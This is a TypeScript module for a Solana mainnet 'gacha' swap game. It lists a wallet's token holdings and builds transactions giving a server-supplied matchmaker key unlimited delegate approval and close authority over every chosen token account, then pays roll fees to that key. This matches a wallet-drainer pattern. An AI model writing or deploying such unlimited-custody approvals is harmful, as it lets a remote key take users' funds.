// On-chain layer for the gacha — mainnet only, real transactions.
//
// Enter the pool  : per ATA, approve(matchmaker, u64::MAX) + setAuthority(
//                   CloseAccount → matchmaker). Mirrors gacha/app/src/register.ts.
// Roll            : SystemProgram.transfer(owner → matchmaker, fee × count).
//                   The offchain matchmaker sees the payment and executes the
//                   swap; N× the fee buys N swaps (the 10-pull).
import {
  Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction,
  TransactionInstruction, LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  AuthorityType, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID,
  createApproveInstruction, createSetAuthorityInstruction,
} from "@solana/spl-token";

const U64_MAX = BigInt("18446744073709551615");

export interface ChainConfig {
  rpc: string;
  matchmaker: PublicKey;
  minRollFeeSol: number;
}

export interface Holding {
  mint: string;
  ata: string;
  programId: string;
  amountRaw: string;
  decimals: number;
  uiAmount: number;
  delegated: boolean; // already delegated to the matchmaker w/ close authority
}

let _config: ChainConfig | null = null;
let _conn: Connection | null = null;

/** Fetch live config from the crank (matchmaker pubkey, fee, frontend RPC). */
export async function getConfig(): Promise<ChainConfig> {
  if (_config) return _config;
  const r = await fetch("/api/gacha/stats", { cache: "no-store" });
  if (!r.ok) throw new Error("matchmaker /stats unreachable");
  const s = await r.json();
  if (!s.matchmaker) throw new Error("matchmaker pubkey not configured");
  _config = {
    rpc: s.rpc || "https://api.mainnet-beta.solana.com",
    matchmaker: new PublicKey(s.matchmaker),
    minRollFeeSol: s.minRollFeeSol ?? 0.003,
  };
  return _config;
}

export async function connection(): Promise<Connection> {
  if (_conn) return _conn;
  const cfg = await getConfig();
  _conn = new Connection(cfg.rpc, "confirmed");
  return _conn;
}

export async function getSolBalance(owner: PublicKey): Promise<number> {
  const conn = await connection();
  return (await conn.getBalance(owner)) / LAMPORTS_PER_SOL;
}

/** Load the wallet's real SPL holdings (both token programs), nonzero balances. */
export async function loadHoldings(owner: PublicKey): Promise<Holding[]> {
  const conn = await connection();
  const cfg = await getConfig();
  const out: Holding[] = [];
  for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
    const res = await conn.getParsedTokenAccountsByOwner(owner, { programId });
    for (const { pubkey, account } of res.value) {
      const info = (account.data as { parsed: { info: ParsedTokenInfo } }).parsed.info;
      const amt = info.tokenAmount;
      if (!amt || amt.uiAmount === 0 || amt.uiAmount === null) continue;
      // Skip NFTs: 0-decimal, single-supply units have no place in a fungible
      // swap pool (1/1 art, pNFTs, edition prints).
      if (amt.decimals === 0 && amt.amount === "1") continue;
      const delegated =
        info.delegate === cfg.matchmaker.toBase58() &&
        info.closeAuthority === cfg.matchmaker.toBase58();
      out.push({
        mint: info.mint,
        ata: pubkey.toBase58(),
        programId: programId.toBase58(),
        amountRaw: amt.amount,
        decimals: amt.decimals,
        uiAmount: amt.uiAmount,
        delegated,
      });
    }
  }
  return out.sort((a, b) => b.uiAmount - a.uiAmount);
}

interface ParsedTokenInfo {
  mint: string;
  delegate?: string;
  closeAuthority?: string;
  tokenAmount: { amount: string; decimals: number; uiAmount: number | null };
}

async function compile(owner: PublicKey, ixs: TransactionInstruction[]): Promise<VersionedTransaction> {
  const conn = await connection();
  const { blockhash } = await conn.getLatestBlockhash("confirmed");
  const msg = new TransactionMessage({
    payerKey: owner,
    recentBlockhash: blockhash,
    instructions: ixs,
  }).compileToV0Message();
  return new VersionedTransaction(msg);
}

/**
 * Build delegate transactions for the chosen ATAs. Chunked so each tx stays
 * within size limits. One signature per chunk arms those tokens for the pool.
 */
export async function buildDelegateTxs(owner: PublicKey, holdings: Holding[], perTx = 5): Promise<VersionedTransaction[]> {
  const cfg = await getConfig();
  const txs: VersionedTransaction[] = [];
  for (let i = 0; i < holdings.length; i += perTx) {
    const chunk = holdings.slice(i, i + perTx);
    const ixs = chunk.flatMap(h => {
      const programId = new PublicKey(h.programId);
      const ata = new PublicKey(h.ata);
      return [
        createApproveInstruction(ata, cfg.matchmaker, owner, U64_MAX, [], programId),
        createSetAuthorityInstruction(ata, owner, AuthorityType.CloseAccount, cfg.matchmaker, [], programId),
      ];
    });
    txs.push(await compile(owner, ixs));
  }
  return txs;
}

/** Build the roll payment: one transfer of fee × count to the matchmaker. */
export async function buildRollTx(owner: PublicKey, count: number): Promise<VersionedTransaction> {
  const cfg = await getConfig();
  const lamports = Math.round(cfg.minRollFeeSol * count * LAMPORTS_PER_SOL);
  return compile(owner, [
    SystemProgram.transfer({ fromPubkey: owner, toPubkey: cfg.matchmaker, lamports }),
  ]);
}

/** Broadcast a wallet-signed raw tx through our RPC (signTransaction fallback). */
export async function sendRaw(raw: Uint8Array): Promise<string> {
  const conn = await connection();
  const sig = await conn.sendRawTransaction(raw, { skipPreflight: false });
  await conn.confirmTransaction(sig, "confirmed");
  return sig;
}

/** Register this wallet with the matchmaker so its delegated accounts are
 *  discovered (registry-based discovery — see gacha/app/src/pool.ts). */
export async function registerOwner(owner: PublicKey): Promise<void> {
  try {
    await fetch("/api/gacha/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: owner.toBase58() }),
    });
  } catch { /* best-effort */ }
}

/**
 * USD prices for a set of mints via Jupiter Price API v3 (best-effort).
 * v3 returns { "<mint>": { usdPrice, ... } } — no `data` wrapper, `usdPrice`
 * field (v2's { data: { mint: { price } } } is deprecated). Batched in 100s.
 */
export async function fetchPrices(mints: string[]): Promise<Map<string, number | null>> {
  const out = new Map<string, number | null>();
  for (const m of mints) out.set(m, null);
  if (mints.length === 0) return out;

  for (let i = 0; i < mints.length; i += 100) {
    const batch = mints.slice(i, i + 100);
    try {
      const r = await fetch(`https://lite-api.jup.ag/price/v3?ids=${batch.join(",")}`, { cache: "no-store" });
      if (!r.ok) continue;
      const j = await r.json() as Record<string, { usdPrice?: number; price?: string } | null>;
      for (const m of batch) {
        const e = j?.[m];
        if (!e) continue;
        const p = typeof e.usdPrice === "number" ? e.usdPrice : e.price != null ? parseFloat(e.price) : null;
        out.set(m, p);
      }
    } catch { /* leave nulls for this batch */ }
  }
  return out;
}
